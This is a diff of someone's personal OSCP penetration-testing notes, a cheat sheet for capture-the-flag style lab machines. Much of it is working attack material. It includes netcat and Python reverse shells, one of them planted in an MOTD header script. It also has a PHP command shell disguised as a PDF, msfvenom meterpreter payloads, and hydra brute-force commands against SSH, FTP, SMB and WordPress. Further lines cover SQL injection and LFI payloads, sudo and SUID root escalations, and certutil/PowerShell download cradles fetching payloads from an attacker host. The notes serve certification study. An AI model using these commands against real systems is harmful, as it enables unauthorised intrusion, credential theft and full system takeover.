@@ -1,17 +1,17 @@
-PERSONAL OSCP NOTES ~KUNAL PATEL
+PERSONAL OSCP NOTES ~Kunal Patel
 ==-==-==-==-==-==-==-==-==-==-==
 
 Cyberchef --> website that allows decoding and encoding of various stuffs like ssh(RSA,cipher),jpg etc
 
-
-===================================
-NMAP: Network Mapper (Port Scanner)
-===================================
+==================
+Nmap: Port Scanner 
+===================
 nmap -A -p- -T4 192.168.6.145
 nmap -sV 192.168.20.10-12 -oA bookversionnmap
 nmap -sS -T4 -A [IP]
 nmap -sS -sC -sV -Pn -T4 -vv 192.168.6.137
-
+nmap -sT -sV -A -O -v -p 1-65535 192.168.1.24
+nmap -T4 -sS -sV -sC -Pn
 (-A = -O + -sV + -sC + --traceroute)
 
 Stealth Scan -sS
@@ -26,21 +26,50 @@ FIN Scan     -sF
 
 Always Use Autorecon.py :)
 
-================
-HTTP enumeration
-================ 
+====
+tmux
+====
+Learning tmux is handy and important and it saves your time
+Start tmux by typing tmux in terminal
+	Prefix key: ctrl + b
+	Open new pane Prefix c
+	Open new pane in same window
+		Horizaontally: prefix + %
+		Vertically: prefix + "
+	Rename the window : prefix  ,
+	Search the window : prefix (ctrl + s)
+		press q to quit search
+	Scroll through pane: prefix [ then arrow keys
+	tmux ls
+	tmux new-session
+	Detach session	
+		prefix d
+	tmux attach-session 3
+
+====================
+HTTP(80) enumeration
+====================
 go to website and view source code
  
 Check for /robots.txt
 
 using dirbuster
-dirb http://192.168.6.139
-dirb http://192.168.6.139 -X .php
-dirb http://192.168.6.139 -X .txt
-dirb http://192.168.6.139 -X .html
+	dirb http://192.168.6.139
+	dirb http://192.168.6.139 -X .php
+	dirb http://192.168.6.139 -X .txt
+	dirb http://192.168.6.139 -X .html
 
 or gobuster 
-
+	gobuster dir -u http://<ip>:<port> -w <word list location>
+		GoBuster flag			Description
+		--------------         -------------
+			-e						Print the full URLs in your console
+			-u						The target URL
+			-w						Path to your wordlist
+			-U and -P				Username and Password for Basic Auth
+			-p <x>					Proxy to use for requests
+			-c <http cookies>		Specify a cookie for simulating your auth
+			
 then nikto -h 192.168.6.141
      nikto -host=http://www.megacorpone.com -maxtime=30s
 		- Nikto v2.1.6
@@ -51,6 +80,7 @@ then nikto -h 192.168.6.141
 		---------------------------------------------------------------------------
 
 SPARTA and autorecon.py are recon automators.
+
 ---------------------
 Exploiting PUT method
 ---------------------
@@ -87,6 +117,18 @@ Metasploit has built-in aux module to PUT file
 	msf>auxiliary (http_put) > set filedata file://root/Desktop/meter.php
 	msf>auxiliary (http_put) > exploit
 	
+=======================
+https (443) enumeration
+=======================
+Read the actual SSL CERT to:
+	- find out potential correct vhost to GET
+	- is the clock skewed
+	- any names that could be usernames for bruteforce/guessing.
+
+sslscan 10.11.1.111:443
+./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
+nmap -sV --script=ssl-heartbleed 192.168.101.8
+
 ===============
 base 64 stuffs
 ===============
@@ -97,7 +139,6 @@ echo -n asasasasassadasdasdasdas= | base64 -d
 
 echo -n asasasasassadasdasdasdas= | base64 -d | wc -c (WORD COUNT FOR asasasasassadasdasdasdas=)
 	25
-
 
 ==============
 DNS Resolution 
@@ -112,7 +153,8 @@ dig axfr @192.168.6.136 kioprio2.com >> zonetransfer (For appending/updating the
 
 dig @10.10.176.179 bookface.com -t TXT
 	to find flag2 with TXT header 
-	
+
+dig -x <host> # reverses lookup host
 ==========================================
 Automating websites checking from dns res
 ========================================== 
@@ -162,13 +204,22 @@ Samba is contained in three packages:
 *)samba, which contains the Samba server
 *)samba-client, which contains the Sambasmbclient,smbmount,and smbprint programs and associated files and documentation
 
+
 smbmap is used to list out open directories and it's permissions
 smbclient is used to connect to those open directories 
 
+Bruteforce smb using hydra
+--------------------------
+hydra -t 1 -V -f -L username.txt -p "Welcome123!" 10.10.10.169 smb
+
+List Open Directories
+---------------------
 smbmap -H 192.168.6.136
 smbmap -H 192.168.6.136 -R --depth 5 ( -R Recursively list directories, --depth 5 Traverse a directory tree to a specific depth)
 smbmap -H 192.168.6.135 -u admin -p password
 
+Connect to open Directories
+---------------------------
 smbclient //192.168.6.136
 smbclient //192.168.6.136/(directory/disk_name)
 	> get s33cret.txt
@@ -191,9 +242,27 @@ smb: \> prompt off
 smb: \> mget *
 
 
-==========================================
+smb Server
+----------
+To create a smb server share named kali 
+	sudo impacket-smbserver -smb2support kali `pwd`
+it will make a share named kali in your kali with pwd (eg:Desktop or whatever you r in)
+
+To connect to your kali share form victim (Dns admin Priv esc)
+	dnscmd Resolute /config /serverlevelplugindll \\10.10.15.45\kali\privesc.dll
+
+==========
+enum4linux
+==========
+Scan everything
+	enum4linux -a 10.11.1.111
+	
+To list usernames 
+	enum4linux -U 10.10.10.182
+	
+====================================================
 NFS (Network File System) open mount vuln (port 111)
-==========================================
+====================================================
 showmount -e 192.168.6.154
 or
 showmount --exports 192.168.6.146
@@ -214,8 +283,6 @@ http://192.168.6.146/nandi.php?file=/home/shivay/reverse.php
 
 What ever we upload into mounted NFS, it get's uploaded into actual NFS
 
-
-
 =============================================
 Download files within meterpreter/reverse_tcp
 ==============================================
@@ -225,29 +292,67 @@ to download files from victim machine to kali
 
 	meterpreter > download \openssh.gzip /root/Desktop/
 
-
 =================
 SNMP Enumeration (PORT 161)
 =================
 snmp is common in windows machines
 
 snmpwalk -c public -v2c 10.10.10.116
-
+snmpwalk -v 2c -c public 10.10.10.116
 snmp-check 10.10.10.116
- 
+snmp-check 10.11.1.111 -c public|private|community
+nmap -sU -p 161 --script snmp-win32-services 10.10.10.116
+nmap -sU -p 161 --script snmp-win32-users 10.10.10.116
+nmap -sU -p 161 --script snmp-brute 10.10.10.116 
+nmap -vv -sV -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
 onesixone 
 
+===============
+LDAP (port 389)
+===============
+Search for default naming context in LDAP
+	ldapsearch -h 10.10.10.182 -x -s base defaultNamingContext
+
+We get the default naming context
+	defaultNamingContext: DC=cascade,DC=local
+	
+So now we can use defaultNamingContext with ldapsearch
+	ldapsearch -h 10.10.10.182 -x -b "dc=cascade,dc=local" > ldapsearch.txt
+	
+	cat ldapsearch.txt | grep Pwd
+			And we get the stored Password from the ldap scan 
+			(Open it using text editor and search again and u get username as well)
+
+also use enum4linux to grab usernames and other important information
+
+===========
+finger (79)
+===========
+nmap --script finger -p79 10.10.10.116
+finger sshd@10.10.10.116
+
 ==========
-ssh
+RDP (3389)
 ==========
+Check if guest login allowed
+	rdesktop -u guest -p guest 10.11.1.111 -g 94%
+	
+To login inside Rdp use rdesktop or xfreerdp
+	rdesktop -u Kunal -p Patel -g 85% -r disk:share=/root/ 10.11.1.111
+	rdesktop -u Kunal -p Patel 10.11.1.111 -g 94%
+	xfreerdp /u:Kunal /p:Patel /v:10.10.2.138
+
+=============
+ssh (port 22)
+=============
 Login to ssh
-ssh root@10.10.10.16
+	ssh root@10.10.10.16
 
 Login to ssh via private key
-ssh -i isakey.key user@10.10.10.146
- (Also it might ask for passphrase, use ssh2john and crack it) 
- to copy isa_key from user (You need access to user :p)
-	copy from /home/root/.ssh/isa.key (But for that we first need the access to victim to steal the private key :)
+	ssh -i isakey.key user@10.10.10.146
+	 (Also it might ask for passphrase, use ssh2john and crack it) 
+	 to copy isa_key from user (You need access to user :p)
+		copy from /home/root/.ssh/isa.key (But for that we first need the access to victim to steal the private key :)
 	
 Bruteforcing the ssh
 	hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.6.151 ssh -t 4
@@ -255,17 +360,66 @@ Bruteforcing the ssh
 		-P is the word file
 		
 Copying Files from ssh shell
+	Suppose there is a file inside victim machine name user.jpg which u need to copy to kali via ssh then use
+		scp -i id_rsa willow@10.10.154.10:user.jpg flag.jpg	
+			~~It saves user.jpg from victim machine to flag.jpg in kali	
 
-Suppose there is a file inside victim machine name user.jpg which u need to copy to kali via ssh then use
-	scp -i id_rsa willow@10.10.154.10:user.jpg flag.jpg	
+If ssh runs on other port (like 9920)
+	ssh -p 9920 kunal@10.10.10.10
+	
+If ssh is filtered by a proxy lets say on port 3128 run this on kali
+	proxytunnel -p {Victim_IP}:3128 -d 127.0.0.1:22 -a 1234
+	Now connect using ssh
+		ssh john@127.0.0.1 -p 1234
 
-It saves user.jpg from victim machine to flag.jpg in kali
-		
-===
-FTP
-===
+- If you have usernames test login with username:username
+- Vulnerable Versions: 7.2p1
+```
+nc 10.11.1.111 22
+
+===========
+SMTP (25)
+===========
+nc -nvv 10.11.1.111 25
+HELO foo<cr><lf>
+
+telnet 10.11.1.111 25
+VRFY root
+
+nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
+smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111
+
+
+==============
+ Kerberos (88)
+==============
+- MS14-068
+- GetUserSPNs
+
+======================
+Evil-winrm (Port 5985)
+======================
+To connect to victim
+	evil-winrm -e Username -p 'Password' -i RHOST
+
+To see hidden files
+	ls -hidden
+	
+=============
+FTP (Port 21)
+=============
+Ftp anonymous login allowed
+
+	ftp 10.10.16.69
+	name: anonymous
+	ftp:> dir
+	
+	If nothing shows type maybe file is hidden
+	ftp:> ls -lah
+	
+	
 Bruteforce FTP with user jerry
-hydra -l jerry -P /usr/share/wordlists/rockyou.txt 10.10.176.179 ftp
+	hydra -l jerry -P /usr/share/wordlists/rockyou.txt 10.10.176.179 ftp
 
 
 =========================
@@ -275,12 +429,21 @@ There may be times where /etc/passwd file is editable
 And you may wanna add your own root user with password 
 So here is how to generate a password
 
-openssl passwd -1 -salt kunal patel
+	openssl passwd -1 -salt kunal patel
 
 And it will create a user name kunal with password patel
 
 kunal:$xxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash                   (where xxxxx is encrypted password)
 
+========
+exiftool
+========
+exiftool is a tool that extracts metadata from images
+binwalk is also a tool that extracts data from images	
+	If theres a zip file inside a image
+		use: binwalk -e image.jpg
+		And it will extract zip file inside a "_xxxx" Folder
+		
 =============
 SQL INJECTION
 =============
@@ -288,8 +451,19 @@ SQL INJECTION
          
 		'
 		' or '1'='1
+		' || 1=1# 
 		%' or '0'='0
 		
+### Sql-login-bypass
+--------------------
+		- Open Burp-suite
+		- Make and intercept a request
+		- Send to intruder
+		- Cluster attack.
+		- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
+		- Attack
+		- Check for response length variation
+			
 
 ' ORDER BY 1--
 ' ORDER BY 2--
@@ -343,8 +517,27 @@ http://192.168.6.146/nandi.php?file=/home/shivay/reverse.php
 http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=index
 http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=config
 http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=upload
+php://filter/convert.base64-encode/resource=/var/www/html/backup.forwardslash.htb/dev/index.php
 
-
+# LFI Windows
+http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00
+-------------------------------------
+Local File inclusion bypass using ext
+-------------------------------------
+A site that gives output of dogs pic
+	http://10.10.90.167/?view=dog
+Doing
+	http://10.10.90.167/?view=../../../etc/passwd
+Get error : only dogs are allowed
+So doing
+	http://10.10.90.167/?view=dog)../../../etc/passwd
+Get error : file not found
+So that means it appends everything to .php so to bypass this .php appending at the end use "ext"
+	http://10.10.90.167/?view=dog)../../../etc/passwd&ext=
+we get the etc/passwd
+	Now do Apache Log Poisoning through LFI to get a shell
+	
+-----------
 PHP wrapper
 -----------
 We can use the data280 wrapper to embed inline data as part of the URL with plaintext or base64281
@@ -356,9 +549,9 @@ file with PHP code. (can also gain a shell {RFI} using wrapper)
 		
 		
 Upoad a fake file
-------------------
+-----------------
 If server allows only pdf files to be uploaded use %PDF header like:
-
+--------------------------------------------------------------------
 	%PDF-1.4
 	<?php	
 		system($_GET["cmd"]);
@@ -368,30 +561,31 @@ http://192.168.6.136/index.php?page=uploads/shell.pdf%00&cmd=whoami
 
 
 If server allows only .jpg files to be uploaded insert reverse shell into metadata of an image
-
+-----------------------------------------------------------------------------------------------
 	Upload any image file with xx.php.jpg/xx.jpg.php extension.
 	Fire up burpsuit and change file type to image/php (This step Not necessary )
 	And using burpsuit remove middle contents of image and add reverse shell php contents.
 	Also check param tab in burpsuit to make sure it's not leaking reverse shell contents.
-
-				Server provides image upload
-				Uploaded
-				 bird.php.jpeg 
+			Eg:
+				Server allows image upload
+				Upload image with name bird.php.jpeg 
+				 Go to burp 
+				 Change middle content of image with php reverse shell
 				 
 				 set up nc listner on kali
 				 
-				 then going to 
-				 10.10.10.185/image/uploads/bird.php.jpeg gives you shell
+				 then execute the image and get the shell
+				in this case it is
+				
+				 10.10.10.185/image/uploads/bird.php.jpeg 
 
 
-
+Getting Revershell
+--------------------
 Upload a reverse_shell file into vuln server 
  and connect to it
- For eg:
- http://192.168.x.x/connect.php?file=/uploads/reverse.php
-
-
-
+	For eg:
+		http://192.168.x.x/connect.php?file=/uploads/reverse.php
 
 =====================
 REMOTE FILE INCLUSION
@@ -412,18 +606,22 @@ http://kioptrix3.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%2019
 
 Now to create 
 Reverse Shell payload using msfvenom 
+		msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.6.146 LPORT=4444 >> exploit.php
 
-msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.6.146 LPORT=4444 >> exploit.php
+		now open msfconsole to set a listener like netcat for our msfvenom payload
 
+		msfconsole
+		use exploit/multi/handler
+		set LHOST [kali_ip]
+		set LPORT [4444]
+		set payload php/meterpreter/reverse_tcp
+		exploit
 
-now open msfconsole to set a listener like netcat for our msfvenom payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 EXITFUNC=thread -f aspx > rev.aspx
 
 msfconsole
 use exploit/multi/handler
-set LHOST [kali_ip]
-set LPORT [4444]
-set payload php/meterpreter/reverse_tcp
-exploit
+set payload windows/meterpreter/reverse_tcp
 
 =====
 zico2
@@ -490,14 +688,34 @@ sudo apt-get install fcrackzip
 RarCrack by David Zoltan Kedves is a simple bruteforce zip,7-zip and rar password cracker.
 sudo apt-get install rarcrack
 
-hashes.org
+
 crackstation.net
+hashes.com
+
+https://hashkiller.co.uk/Cracker
+https://www.cmd5.org/
+https://www.onlinehashcrack.com/
+https://gpuhash.me/
+https://crackstation.net/
+https://crack.sh/
+https://hash.help/
+https://passwordrecovery.io/
+http://cracker.offensive-security.com/
+
+hashes.org
 
 ====================
 WORDPRESS BRUTEFORCE
 ====================
 hydra -l kunal -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/wp-login.php:log=kunal&pwd=^PASS^:ERROR
 
+Enumerate full wordpress site
+-----------------------------
+wpscan --url http://wordy/
+
+If wordpress site is on port 443
+ wpscan --url https://wordy/ --disable-tls-checks
+ 
 Enumerates Users on Site 
 -----------------------
 wpscan --url http://wordy/  --enumerate u
@@ -511,6 +729,23 @@ wpscan --url http://192.168.0.18 --wordlist=/root/Downloads/fsocity.dic --userna
 wpscan --url http://192.168.6.145 -P /root/Downloads/fsocity.dic -U elliot
 
 wpscan --url http://wordy/ --password-attack wp-login
+
+==========
+pop3 (110)
+==========
+Use thunderbird mail client to login
+	Open ThunderBird -> Add Email -> Login
+	
+	
+===========
+james (4555)
+===========
+login default as root:root via nc
+	nc [VICTIM_IP] 4555
+listusers
+change users password
+then use pop3 as a user to check mails
+
 ============
 mysql (3306)
 ============
@@ -534,10 +769,34 @@ select * from key;   <----------- Shows everything from that key table
 
 
 if 3306 running and mysql not found
-try other 
-like mysqladmin
-	mysqldump --databases Magic -u theseus -p
-	etc
+try other mysql services
+	like mysqladmin
+		sqli
+		mysqldump --databases Magic -u theseus -p
+		etc
+		
+=======================
+POWERSHELL Exploitation
+=======================	
+
+=================
+Shell Restriction
+=================
+restricted shell
+
+ssh mindy@10.10.10.51 
+password:
+Welcome
+mindy@swag:cd ..
+-rbash: sudo: command not found 
+
+Login as
+ssh mindy@10.10.10.51 'bash -–noprofile'
+to get shell escape
+
+https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
+https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=9
+
 ================
 priv escalation
 ================
@@ -547,21 +806,28 @@ priv escalation
 	Exploiting SUDO rights/user
 	Exploiting badly configured cron jobs
 	Exploiting users with '.' in their PATH
-	
-	
-	
+
+- Installed software
+- Weak/reused/plaintext passwords
+- Inside service
+- World writable scripts invoked by root
+- Unmounted filesystems
+- Look in /var/backups
+- Look in /etc/fstab y en mount
+Less likely
+- Private ssh keys
+- Bad path configuration
+- Cronjobs
+
 netstat -antp   (Shows which ports/ip machine is listening to)
-
+netstat -ano
 ps -aux | grep root
-
 ls -la on etc/passwd or etc/shadow
 
 uname -a (to get full kernel version)
-
 sudo -l (shows what current user can execute as root)
-
-bypass -u user restriction by appending another user
-sudo -u robert -u root cat /root/root.txt
+	sudo -u robert -u root cat /root/root.txt (bypass -u user restriction by appending another user)
+	sudo -u scriptmanager /bin/bash
 
 Distribution information is in
 	- etc/release
@@ -571,6 +837,13 @@ Run ltrace command against any setuid and setgid programs found
 Look for setuid programs with:
 	find directory -user root -perm -4000 -exec Ls -ld {} \; >/tmp/gaping-security-hole
 	
+----------------
+kernel exploits
+----------------
+Pre compiled kernel exploits
+	https://github.com/lucyoa/kernel-exploits
+		~Dirtycow & rds
+		
 Weak permissions on LD_PRELOAD (LINUX) DLL_SIDELOAD(WINDOWS)
 
 TO FIND EXECUTABLES WHICH HAVE SUID BIT SET USE
@@ -582,9 +855,9 @@ linuxprivchecker.py     linPrivchecker.sh     Linexploitchecker.sh
 
 Also use "pspy github" to check every running process on machine every sec (usefull for finding cron processes)
 
----------------
-Exploiting PATH
----------------
+-------------------------------------
+Gaining ROOT with PATH vulnerability
+-------------------------------------
 suppose sysinfo running as root and it executes fdisk without path
 export PATH=/tmp:$PATH
 
@@ -594,27 +867,80 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 Set up another nc listner on 920 and u r root
 
 
+Another example of gaining root via PATH vulnerability is using python library hi-jacking
+-----------------------------------------------------------------------------------------
+let's say a backup.py python file is running some python script as root every few minutes
+and it imports few libraries like
+	import os
+	import zipfile 
+	print("hey there KIDS :P")
+	etc
+So we can take advantage of it by creating a zipfile.py or os.py in the same directory containing our python reverse shell.
+So now when backup.py runs it imports our os.py and zipfile.py instead of loading from actual library as it is in the same folder 
+giving us the reverse shell as root.
+
+
+# SUID
+---------
+find / -perm -4000 -type f 2>/dev/null
+
+# ALL PERMS
+------------
+find / -perm -777 -type f 2>/dev/null
+
+# SUID for current user
+-------------------------
+find / perm /u=s -user `whoami` 2>/dev/null
+find / -user root -perm -4000 -print 2>/dev/null
+
+# Writables for current user/group
+-----------------------------------
+find / perm /u=w -user `whoami` 2>/dev/null
+find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
+find / -perm /u+w -user `whoami` 2>/dev/nul
+
+# Dirs with +w perms for current u/g
+-------------------------------------
+find / perm /u=w -type -d -user `whoami` 2>/dev/null
+find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
+
 -------------
 MOTD Priv esc
 -------------
 While logging into an ssh if MOTD(Message Of The Day) found (Header)
 
-
+In VICTIM
 Go to /etc/update-motd.d/ and type following
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.66 420 >/tmp/f" >> 00-header 
 
 Now wait on nc -nvlp 420
 
 This was the reverse shell from pentest monkey ;)
+
 --------------------
 Gaining root via zip
 --------------------
 If sudo -l shows user can execute zip as a root
-use 
-
-sudo zip /tmp/kunal.zip /tmp/ -T --unzip-command="sh -c /bin/bash"
-
+create a kunal.zip file inside /tmp
+	sudo zip /tmp/kunal.zip /tmp/ -T --unzip-command="sh -c /bin/bash"
 and you are root
+
+-----------------------------
+If systemctl has SUID bit set
+-----------------------------
+run this (Gtfobins)
+	TF=$(mktemp).service
+	echo '[Service]
+	Type=oneshot
+	ExecStart=/bin/sh -c "chmod +s /bin/bash"
+	[Install]
+	WantedBy=multi-user.target' > $TF
+	/bin/systemctl link $TF
+	/bin/systemctl enable --now $TF
+
+	now run /bin/bash -p
+	id
+	and ur root
 
 -------------------------------
 Sudo -l (find,python,cat,mysql)
@@ -623,6 +949,13 @@ sudo find /home -exec sh -i \;
 sudo python -c 'import pty;pty.spawn("/bin/bash");'
 sudo cat /etc/shadow (:P and use john to crack password)
 sudo mysql -e '\! /bin/sh'
+
+-----------------
+Sudo -l (/bin/su)
+-----------------
+If /bin/su is allowed to run as root with No password
+	Then what else do u need in life man
+		sudo /bin/su root
 
 ------------------------------------------------------------------------------
 Sudo -l (ftp,expect,env,ed,perl,socat,less,man,git,pico,scp,ssh,curl,vi,rvim,)
@@ -679,7 +1012,9 @@ RVIM
 	!bash
 	id
 	
+-----------------------------------------------------------	
 sudo -l for weak permissions gives you root using GTFOBINS
+-----------------------------------------------------------
 /bin/ash
 /usr/bin/awk
 /bin/bash
@@ -790,24 +1125,41 @@ And got root. You can also make a .sh file for it and run via "nmaproot.sh"
 CVE-2019-14287 Sudo vuln 
 -------------------------
 This vulnerability occurs when sysadmin inserts an entry into the sudoers file
-For eg: 
-		mahakal myhost = (ALL, !root) usr/bin/watch
-
-To get priv esc:
+		
+For eg:
 	sudo -l
-	[sudo] password for mahakaal: 
-	Matching Defaults entries for mahakaal on ubuntu:
-		env_reset, mail_badpass,
-		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
 	User mahakaal may run the following commands on ubuntu:
 		(ALL, !root) /usr/bin/watch
-		^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 	if this found type 
-
 	sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0' -u
 
-AND YOU ARE ROOT (just replace "watch" with appropriate name)
+AND YOU ARE ROOT
+
+For eg: If /bin/bash can be run as (ALL, !root)
+			(ALL, !root) /bin/bash
+				sudo -u#-1 /bin/bash
+
+-----------------
+Windows privesc
+-----------------
+(1: Windows-Exploit-Suggester)
+-------------------------------
+On Victim
+   systeminfo > systeminfo.txt
+   Transfer this systeminfo.txt into kali
+
+On Kali
+	use windows-exploit-suggester.py
+	https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+	
+	python windows-exploit-suggester.py --update
+	it generates a xxxx.xlsx file
+	
+	python windows-exploit-suggester.py --database xxxx.xlsx --systeminfo systeminfo.txt 
+
+
+
+
 
 ===============
 port forwarding
@@ -826,6 +1178,7 @@ Tunnel the port running on victim machine to your localhost (using ssh) and acce
 On kali
 	ssh -L 52846:127.0.0.1:52846 jimmy@10.10.10.171
 	ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
+
 ====
 GREP
 ====
@@ -848,27 +1201,37 @@ strings *.sdf | more
 ========================
 Python Interactive shell
 ========================
+First check python installed or not	
+	python -c "print('hello')"
+	python3 -c "print('hello')"
+	
 Once you get reverse shell, if dont wanna accidentally kill it with ctrl+c
-
-
-python -c "import pty; pty.spawn('/bin/bash')"
-python3 -c "import pty; pty.spawn('/bin/bash')"
-ctrl+z
-stty raw -echo
-fg
-export TERM=xterm
+	python -c "import pty; pty.spawn('/bin/bash')"
+	python3 -c "import pty; pty.spawn('/bin/bash')"
+	ctrl+z
+	stty raw -echo
+	fg
+	export TERM=xterm
 
 ====
 curl
 ====
+So there was a machine (Openadmin) where a port 52846 was running a webservice which was asking for username and password.
+But as i didn't had browser as i was on a tty reverse shell, so instead of doing portforwarding and opening it through kali's browser.
+I decided to use Curl
 
 curl -d "username=jimmy&password=n1nj4W4rri0R!" -X POST http://localhost:52846/main.php
-	
-	Sends POST data with creds	
+	~It Sends POST data with creds	
 
 ===============
 TRANSFER FILES
 ===============
+--------------------
+Linux File Transfer
+--------------------
+
+Using APACHE
+-=-=-=-=-=-=-
 sudo apt-get install apache2
 service apache2 start
 cp xxx /var/www/html
@@ -879,17 +1242,27 @@ chmod 777 exploit
 ./exploit
 whoami
 
-OR
+Using SimpleHTTPServer
+-=-=-=-=-=-=-=-=-=-=-=
 to create a server on current directory
 
 python -m SimpleHTTPServer 800
 	Serving HTTP on 0.0.0.0 port 800 ...
 	
-OR 
+----------------------
+Windows File Transfer
+----------------------
 
 to transfer on windows using powershell
 	kali	
 		python -m SimpleHTTPServer
 	Windows
-		powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/reverse.exe','C:\Users\jarrieta\Desktop\reverse.exe')"
+		using powershell
+		powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5/PowerUp.ps1','C:\Users\Public\Downloads\PowerUp.ps1')"
+		
+		or using internet explorer
+		IEX(New-Object Net.Webclient).downloadString('http://10.10.14.5/PowerUp.ps1')
+
+		or using cert util
+		certutil -urlcache -f http://10.10.14.5/4120.exe root.exe
 		
